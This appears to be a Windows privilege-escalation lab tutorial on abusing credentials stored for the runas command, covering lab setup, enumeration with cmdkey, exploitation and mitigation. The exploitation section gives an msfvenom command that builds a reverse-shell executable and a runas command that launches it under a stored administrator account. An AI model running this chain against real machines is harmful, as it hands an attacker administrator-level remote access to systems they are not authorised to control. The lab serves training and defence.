# Stored Credentials (Runas)

## Table of Contents

- [Stored Credentials (Runas)](#stored-credentials-runas)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

The Credentials Manager is a feature in Windows that securely stores usernames and passwords for websites, applications, and network resources. This component is particularly helpful for users who want to manage and retrieve their login information easily without having to remember each set of credentials.

In a scenario where an attacker has compromised an account with access to the Windows Credentials Manager and has obtained stored credentials from an elevated account, he can potentially use the "runas" command to elevate his privileges and gain unauthorized access. 

## Lab Setup

### Manual Lab Setup

:warning: <b>If you are using Windows 10/11 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>

1) Open a command-prompt with local Administrator privileges and create a new user with the following command:

```
net user nickvourd Passw0rd! /add
```

2) Add the new user to Administrator's local group:

```
net localgroup "Administrators" nickvourd /add
```

3) Save credentials to Windows Credentials Manager:

```
runas /savecred /user:WORKGROUP\nickvourd cmd.exe
```

Outcome:

![Stored-Creds-Manual-Lab-Setup](/Pictures/Stored-Creds-Manual-Lab-Set-Up.png)

4) Verify the new stored credentials on Windows Credentials Manager (**Control Panel** > **User Accounts** > **Credential Manager**):

![Stored-Creds-Verify-New-Windows-Creds](/Pictures/Stored-Creds-Control-Panel-4.png)

### PowerShell Script Lab Setup

:warning: <b>If you are using Windows 10/11 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>

Another way to set up the lab with the 'Stored Credentials (Runas)' scenario is by using the custom PowerShell script named [StoredCredentialsRunas.ps1](/Lab-Setup-Scripts/StoredCredentialsRunas.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\StoredCredentialsRunas.ps1
```

:information_source: Please provide the password generated for the `runas` command.

Outcome:

![Stored-Creds-Tool-Lab-Setup](/Pictures/Stored-Creds-Tool-Lab-Set-Up.png)

## Enumeration

To perform enumeration, you can open a command prompt and use the following command to enumerate the stored credentials in the Windows Credentials Manager:

```
cmdkey /list
```

Outcome:

![Stored-Creds-Enum](/Pictures/Stored-Creds-Enum.png)

## Exploitaion

To abuse this scenario you should follow these steps:

1) Create with msfvenom a malicous executable file (i.e., nikos.exe):

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.exe
```

2) Transfer the malicious executable file to victim's machine.

3) open a listener from your attacking machine.

4) Grant full access permissions to all users:

```
icacls "C:\Windows\Tasks\nikos.exe" /grant Users:F
```

5) Open a command-prompt with regular user privileges and execute the following command:

```
runas /savecred /user:WORKGROUP\nickvourd "C:\Windows\Tasks\nikos.exe"
```

Outcome:

![Stored-Creds-Exploitation-Victim-Side](/Pictures/Stored-Creds-Explotation-1.png)

6) Verify the new reverse shell from your attacking machine:

![Stored-Creds-Exploitation-Attacker-Side](/Pictures/Stored-Creds-Exploitation-2.png)

## Mitigation

To mitigate stored credentials from Windows Credentials manager. Please follow these steps:

1) Open **Control Panel** and navigate **User Accounts** > **Credential Manager**:

![Stored-Creds-Control-Panel](/Pictures/Stored-Creds-Control-Panel.png)

2) Select **Windows Credentials**, choose your preferred stored credentials, and select the **remove** option:

![Stored-Creds-Remove-Creds](/Pictures/Stored-Creds-Control-Panel-2.png)

3) Select the option "Yes" on the pop-up window:

![Stored-Creds-Remove-Creds-Confirmation](/Pictures/Stored-Creds-Control-Panel-3.png)

4) Verify that the stored credentials have been successfully removed from the Windows Credentials Manager:

![Stored-Creds-Remove-Creds-Verification](/Pictures/Stored-Creds-Control-Panel-5.png)

## References

- [Interactive Logon Authentication Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-authsod/bfc67803-2c41-4fde-8519-adace79465f6)
